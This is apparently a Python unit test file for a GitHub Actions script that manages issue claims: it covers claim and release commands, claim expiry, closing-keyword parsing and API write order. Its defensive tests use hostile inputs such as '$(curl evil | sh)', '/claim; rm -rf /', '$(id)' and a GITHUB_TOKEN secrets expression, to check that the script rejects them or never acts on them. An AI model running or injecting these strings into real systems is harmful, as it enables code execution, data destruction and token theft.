import importlib.util
import json
import unittest
from datetime import datetime, timedelta, timezone
from pathlib import Path


ROOT = Path(__file__).resolve().parents[2]
spec = importlib.util.spec_from_file_location("issue_claims", ROOT / "scripts/issue_claims.py")
claims = importlib.util.module_from_spec(spec)
spec.loader.exec_module(claims)

NOW = datetime(2026, 11, 27, 12, 0, tzinfo=timezone.utc)
A = claims.Action


def comment_facts(**overrides):
    facts = dict(
        body="/claim",
        author="alice",
        author_type="User",
        association="NONE",
        issue_number=7,
        is_pull_request=False,
        is_open=True,
        labels=("ready-for-agent",),
        assignees=(),
        author_claims=(),
    )
    return claims.CommentFacts(**{**facts, **overrides})


def expiry_facts(**overrides):
    facts = dict(
        issue_number=7,
        labels=("ready-for-agent", "in progress"),
        assignees=("alice",),
        claimed_at=NOW - timedelta(hours=25),
        claimed_by="github-actions[bot]",
        linked_pulls=(),
        now=NOW,
    )
    return claims.ExpiryFacts(**{**facts, **overrides})


def comment_text(actions):
    return [action.value for action in actions if action.kind == claims.COMMENT]


class Claim(unittest.TestCase):
    def test_claim_assigns_labels_and_replies(self):
        actions = claims.decide_comment(comment_facts())
        self.assertEqual(actions[:2], [A("assign", "alice"), A("add_label", "in progress")])
        self.assertEqual(len(actions), 3)
        self.assertEqual(actions[2].kind, "comment")
        self.assertIn("@alice", actions[2].value)
        self.assertIn("Closes #7", actions[2].value)

    def test_claim_is_case_and_space_tolerant(self):
        for body in ("/CLAIM", "  /claim  ", "/claim\r\nplease", "/claim\n\nI would like this"):
            with self.subTest(body=body):
                self.assertEqual(claims.decide_comment(comment_facts(body=body))[0].kind, "assign")

    def test_claimed_issue_names_its_holder(self):
        actions = claims.decide_comment(
            comment_facts(labels=("ready-for-agent", "in progress"), assignees=("bob", "carol"))
        )
        self.assertEqual(len(actions), 1)
        self.assertIn("held by `bob`, `carol`", actions[0].value)

    def test_holder_claiming_again_is_told_they_hold_it(self):
        actions = claims.decide_comment(
            comment_facts(labels=("ready-for-agent", "in progress"), assignees=("alice",))
        )
        self.assertEqual([action.kind for action in actions], ["comment"])
        self.assertIn("already hold this issue", actions[0].value)

    def test_assignee_without_label_still_counts_as_claimed(self):
        actions = claims.decide_comment(comment_facts(assignees=("bob",)))
        self.assertEqual([action.kind for action in actions], ["comment"])

    def test_maintainer_label_without_assignee_is_not_claimable(self):
        actions = claims.decide_comment(comment_facts(labels=("ready-for-agent", "in progress")))
        self.assertEqual([action.kind for action in actions], ["comment"])
        self.assertIn("maintainer", actions[0].value)

    def test_issue_without_ready_label_cannot_be_claimed(self):
        for labels in ((), ("ready-for-human",), ("enhancement",)):
            with self.subTest(labels=labels):
                actions = claims.decide_comment(comment_facts(labels=labels))
                self.assertEqual([action.kind for action in actions], ["comment"])
                self.assertIn("cannot be claimed", actions[0].value)

    def test_closed_issue_cannot_be_claimed(self):
        actions = claims.decide_comment(comment_facts(is_open=False))
        self.assertEqual([action.kind for action in actions], ["comment"])
        self.assertIn("closed", actions[0].value)

    def test_third_claim_is_refused_and_names_the_other_two(self):
        actions = claims.decide_comment(comment_facts(author_claims=(3, 5)))
        self.assertEqual([action.kind for action in actions], ["comment"])
        self.assertIn("#3, #5", actions[0].value)

    def test_second_claim_is_allowed(self):
        actions = claims.decide_comment(comment_facts(author_claims=(3,)))
        self.assertEqual(actions[0], A("assign", "alice"))


class Release(unittest.TestCase):
    held = dict(
        body="/release", labels=("ready-for-agent", "in progress"), assignees=("alice",)
    )

    def test_holder_releases(self):
        actions = claims.decide_comment(comment_facts(**self.held))
        self.assertEqual(actions[:2], [A("unassign", "alice"), A("remove_label", "in progress")])
        self.assertEqual(len(actions), 3)

    def test_maintainers_release_someone_elses_claim(self):
        for association in ("OWNER", "MEMBER", "COLLABORATOR"):
            with self.subTest(association=association):
                actions = claims.decide_comment(
                    comment_facts(**{**self.held, "author": "dana", "association": association})
                )
                self.assertEqual(actions[:2], [A("unassign", "alice"), A("remove_label", "in progress")])

    def test_others_cannot_release(self):
        for association in ("NONE", "CONTRIBUTOR", "FIRST_TIME_CONTRIBUTOR", "FIRST_TIMER", "MANNEQUIN"):
            with self.subTest(association=association):
                actions = claims.decide_comment(
                    comment_facts(**{**self.held, "author": "mallory", "association": association})
                )
                self.assertEqual([action.kind for action in actions], ["comment"])
                self.assertIn("Only the holder", actions[0].value)

    def test_maintainer_clears_a_label_with_no_assignee(self):
        actions = claims.decide_comment(
            comment_facts(
                body="/release", association="OWNER", labels=("in progress",), assignees=()
            )
        )
        self.assertEqual(actions[0], A("remove_label", "in progress"))

    def test_unheld_issue_has_nothing_to_release(self):
        actions = claims.decide_comment(comment_facts(body="/release", association="OWNER"))
        self.assertEqual([action.kind for action in actions], ["comment"])
        self.assertIn("Nobody holds", actions[0].value)

    def test_release_removes_every_assignee_but_not_a_missing_label(self):
        actions = claims.decide_comment(
            comment_facts(body="/release", association="OWNER", assignees=("a", "b"))
        )
        self.assertEqual([action.kind for action in actions], ["unassign", "unassign", "comment"])


class Ignored(unittest.TestCase):
    def test_pull_request_comments_are_ignored(self):
        for body in ("/claim", "/release"):
            self.assertEqual(
                claims.decide_comment(comment_facts(body=body, is_pull_request=True)), []
            )

    def test_bot_comments_are_ignored(self):
        self.assertEqual(
            claims.decide_comment(comment_facts(author="github-actions[bot]", author_type="Bot")), []
        )

    def test_only_the_whole_first_line_is_a_command(self):
        for body in (
            "",
            "claim",
            "/claimed",
            "/claim please",
            "please /claim",
            "> /claim",
            "hello\n/claim",
            "\n/claim",
            "`/claim`",
            "/release-all",
            "//claim",
            "/cl\u200baim",
            "/\u0441laim",
        ):
            with self.subTest(body=body):
                self.assertEqual(claims.decide_comment(comment_facts(body=body)), [])

    def test_login_that_is_not_a_github_login_is_ignored(self):
        for author in ("", "al ice", "alice;rm", "$(id)", "a" * 40, "-alice", "alice\n"):
            with self.subTest(author=author):
                self.assertEqual(claims.decide_comment(comment_facts(author=author)), [])


class HostileText(unittest.TestCase):
    def test_comment_text_never_reaches_an_action(self):
        payload = "$(curl evil | sh); `id` ${{ secrets.GITHUB_TOKEN }} @everyone <script>"
        for command in ("/claim", "/release"):
            body = f"{command}\n{payload}"
            actions = claims.decide_comment(
                comment_facts(
                    body=body,
                    association="OWNER",
                    labels=("ready-for-agent", "in progress"),
                    assignees=("alice",),
                )
            )
            self.assertTrue(actions)
            for action in actions:
                self.assertNotIn("curl", action.value)
                self.assertNotIn("secrets", action.value)
                self.assertNotIn("@everyone", action.value)

    def test_huge_body_is_harmless(self):
        body = "/claim\n" + "x" * 1_000_000
        self.assertEqual(claims.decide_comment(comment_facts(body=body))[0].kind, "assign")

    def test_command_with_shell_metacharacters_on_the_first_line_is_no_command(self):
        for body in ("/claim; rm -rf /", "/claim && id", "/claim $(id)", "/claim | tee x"):
            self.assertEqual(claims.decide_comment(comment_facts(body=body)), [])

    def test_assignee_and_label_values_are_fixed_or_validated_logins(self):
        actions = claims.decide_comment(comment_facts(author="alice-1"))
        self.assertEqual(actions[:2], [A("assign", "alice-1"), A("add_label", "in progress")])


class Expiry(unittest.TestCase):
    def test_old_claim_with_no_pull_request_is_released(self):
        actions = claims.decide_expiry(expiry_facts())
        self.assertEqual(actions[:2], [A("unassign", "alice"), A("remove_label", "in progress")])
        self.assertEqual(len(actions), 3)
        self.assertIn("@alice", actions[2].value)
        self.assertIn("Closes #7", actions[2].value)

    def test_claim_within_24_hours_is_kept(self):
        for age in (timedelta(0), timedelta(hours=23, minutes=59), timedelta(hours=24)):
            with self.subTest(age=age):
                self.assertEqual(claims.decide_expiry(expiry_facts(claimed_at=NOW - age)), [])

    def test_claim_just_over_24_hours_is_released(self):
        age = timedelta(hours=24, seconds=1)
        self.assertTrue(claims.decide_expiry(expiry_facts(claimed_at=NOW - age)))

    def test_open_pull_request_keeps_the_claim(self):
        self.assertEqual(claims.decide_expiry(expiry_facts(linked_pulls=(12,))), [])

    def test_label_without_assignee_is_not_a_claim(self):
        self.assertEqual(claims.decide_expiry(expiry_facts(assignees=())), [])

    def test_label_a_maintainer_applied_is_not_a_claim(self):
        self.assertEqual(claims.decide_expiry(expiry_facts(claimed_by="mathih13")), [])

    def test_assignee_without_label_is_left_alone(self):
        self.assertEqual(claims.decide_expiry(expiry_facts(labels=("ready-for-agent",))), [])

    def test_every_assignee_is_released(self):
        actions = claims.decide_expiry(expiry_facts(assignees=("alice", "bob")))
        self.assertEqual([action.kind for action in actions],
                         ["unassign", "unassign", "remove_label", "comment"])
        self.assertIn("@alice, @bob", actions[3].value)


class ClosingNumbers(unittest.TestCase):
    def test_keywords_and_forms(self):
        for body, expected in (
            ("Closes #5", {5}),
            ("closes #5", {5}),
            ("Fixes #6", {6}),
            ("fixed #6", {6}),
            ("Resolves #7", {7}),
            ("resolved: #7", {7}),
            ("What and why\n\nCloses #1385\n", {1385}),
            ("Closes #5, closes #6", {5, 6}),
            ("Closes #5 and Fixes #9", {5, 9}),
        ):
            with self.subTest(body=body):
                self.assertEqual(claims.closing_numbers(body), expected)

    def test_non_closing_references_do_not_count(self):
        for body in (
            None,
            "",
            "Refs #5",
            "See #5",
            "Closes other/repo#5",
            "Closes https://github.com/other/repo/issues/5",
            "Disclosed #5",
            "Closes #",
            "Closes #5x",
            "Closes\n#5",
        ):
            with self.subTest(body=body):
                self.assertEqual(claims.closing_numbers(body), set())


class FakeGithub:
    repository = "Org/Repo"

    def __init__(self, issues, pulls=(), events=None, claims_of=None):
        self.issues = issues
        self.pulls = pulls
        self.events = events or {}
        self.claims_of = claims_of or {}
        self.writes = []
        self.assignable = True

    def api(self, *args):
        method = args[args.index("--method") + 1] if "--method" in args else "GET"
        path = next(arg for arg in args if arg.startswith("repos/"))
        fields = [args[i + 1] for i, arg in enumerate(args) if arg == "-f"]
        if method != "GET":
            self.writes.append((method, path, fields))
            if path.endswith("/assignees") and method == "POST":
                return json.dumps([f.split("=", 1)[1] for f in fields if self.assignable])
            return ""
        parts = path.split("/")
        if path.endswith("/pulls"):
            return "".join(json.dumps(pull) + "\n" for pull in self.pulls)
        if path.endswith("/events"):
            return "".join(json.dumps(e) + "\n" for e in self.events.get(int(parts[4]), []))
        if len(parts) == 5:
            return json.dumps(self.issues[int(parts[4])])
        if "labels=in progress" in fields and any(f.startswith("assignee=") for f in fields):
            assignee = next(f for f in fields if f.startswith("assignee="))[len("assignee="):]
            return "".join(f"{n}\n" for n in self.claims_of.get(assignee, []))
        return "".join(
            json.dumps({"number": n, **{k: v for k, v in issue.items() if k in ("labels", "assignees")}}) + "\n"
            for n, issue in self.issues.items()
            if "in progress" in issue["labels"] and issue["open"]
        )


def comment_env(body, author="alice", association="NONE", number=7):
    return {
        "GITHUB_EVENT_NAME": "issue_comment",
        "COMMENT_BODY": body,
        "COMMENT_AUTHOR": author,
        "COMMENT_AUTHOR_TYPE": "User",
        "COMMENT_ASSOCIATION": association,
        "ISSUE_NUMBER": str(number),
    }


def issue(labels=("ready-for-agent",), assignees=(), open=True, pull_request=False):
    return dict(labels=list(labels), assignees=list(assignees), open=open, pull_request=pull_request)


class Workflow(unittest.TestCase):
    def test_claim_writes_in_order_through_the_issue_endpoints(self):
        gh = FakeGithub({7: issue()})
        claims.main(comment_env("/claim"), gh, NOW)
        self.assertEqual([(m, p) for m, p, _ in gh.writes], [
            ("POST", "repos/Org/Repo/issues/7/assignees"),
            ("POST", "repos/Org/Repo/issues/7/labels"),
            ("POST", "repos/Org/Repo/issues/7/comments"),
        ])
        self.assertEqual(gh.writes[0][2], ["assignees[]=alice"])
        self.assertEqual(gh.writes[1][2], ["labels[]=in progress"])

    def test_claim_stops_before_labelling_when_github_does_not_assign(self):
        gh = FakeGithub({7: issue()})
        gh.assignable = False
        with self.assertRaises(RuntimeError):
            claims.main(comment_env("/claim"), gh, NOW)
        self.assertEqual([p for _, p, _ in gh.writes], ["repos/Org/Repo/issues/7/assignees"])

    def test_claim_reads_live_state_not_the_event(self):
        gh = FakeGithub({7: issue(labels=("ready-for-agent", "in progress"), assignees=("bob",))})
        claims.main(comment_env("/claim"), gh, NOW)
        self.assertEqual([(m, p) for m, p, _ in gh.writes], [("POST", "repos/Org/Repo/issues/7/comments")])
        self.assertIn("held by `bob`", gh.writes[0][2][0])

    def test_claim_counts_other_open_claims(self):
        gh = FakeGithub({7: issue()}, claims_of={"alice": [3, 5]})
        claims.main(comment_env("/claim"), gh, NOW)
        self.assertEqual([p for _, p, _ in gh.writes], ["repos/Org/Repo/issues/7/comments"])
        self.assertIn("#3, #5", gh.writes[0][2][0])

    def test_claim_ignores_this_issue_in_the_count(self):
        gh = FakeGithub({7: issue()}, claims_of={"alice": [3, 7]})
        claims.main(comment_env("/claim"), gh, NOW)
        self.assertEqual(gh.writes[0][1], "repos/Org/Repo/issues/7/assignees")

    def test_release_removes_the_label_by_encoded_name(self):
        gh = FakeGithub({7: issue(labels=("in progress",), assignees=("alice",))})
        claims.main(comment_env("/release"), gh, NOW)
        self.assertEqual([(m, p) for m, p, _ in gh.writes], [
            ("DELETE", "repos/Org/Repo/issues/7/assignees"),
            ("DELETE", "repos/Org/Repo/issues/7/labels/in%20progress"),
            ("POST", "repos/Org/Repo/issues/7/comments"),
        ])

    def test_comment_on_a_pull_request_writes_nothing(self):
        gh = FakeGithub({7: issue(pull_request=True)})
        claims.main(comment_env("/claim"), gh, NOW)
        self.assertEqual(gh.writes, [])

    def test_ordinary_comment_makes_no_api_calls(self):
        class Unreachable:
            repository = "Org/Repo"

            def api(self, *args):
                raise AssertionError("no API call expected")

        claims.main(comment_env("thanks, looks good"), Unreachable(), NOW)

    def test_expiry_releases_only_the_stale_bot_claim_without_a_pull_request(self):
        bot = {"by": "github-actions[bot]"}
        old = (NOW - timedelta(hours=30)).isoformat().replace("+00:00", "Z")
        fresh = (NOW - timedelta(hours=2)).isoformat().replace("+00:00", "Z")
        gh = FakeGithub(
            {
                1: issue(labels=("in progress",), assignees=("alice",)),
                2: issue(labels=("in progress",), assignees=("bob",)),
                3: issue(labels=("in progress",), assignees=("carol",)),
                4: issue(labels=("in progress",), assignees=()),
                5: issue(labels=("in progress",), assignees=("erin",)),
                6: issue(labels=("in progress",), assignees=("frank",), open=False),
            },
            pulls=[{"number": 90, "body": "Closes #2"}, {"number": 91, "body": None}],
            events={
                1: [{"at": old, **bot}],
                2: [{"at": old, **bot}],
                3: [{"at": fresh, **bot}],
                4: [{"at": old, **bot}],
                5: [{"at": old, "by": "mathih13"}],
            },
        )
        claims.main({"GITHUB_EVENT_NAME": "schedule"}, gh, NOW)
        self.assertEqual({p.split("/")[4] for _, p, _ in gh.writes}, {"1"})
        self.assertEqual(
            [(m, p.split("/", 5)[5]) for m, p, _ in gh.writes],
            [("DELETE", "assignees"), ("DELETE", "labels/in%20progress"), ("POST", "comments")],
        )

    def test_expiry_uses_the_latest_label_event(self):
        bot = {"by": "github-actions[bot]"}
        old = (NOW - timedelta(hours=30)).isoformat().replace("+00:00", "Z")
        fresh = (NOW - timedelta(hours=1)).isoformat().replace("+00:00", "Z")
        gh = FakeGithub(
            {1: issue(labels=("in progress",), assignees=("alice",))},
            events={1: [{"at": old, **bot}, {"at": fresh, **bot}]},
        )
        claims.main({"GITHUB_EVENT_NAME": "workflow_dispatch"}, gh, NOW)
        self.assertEqual(gh.writes, [])


if __name__ == "__main__":
    unittest.main()
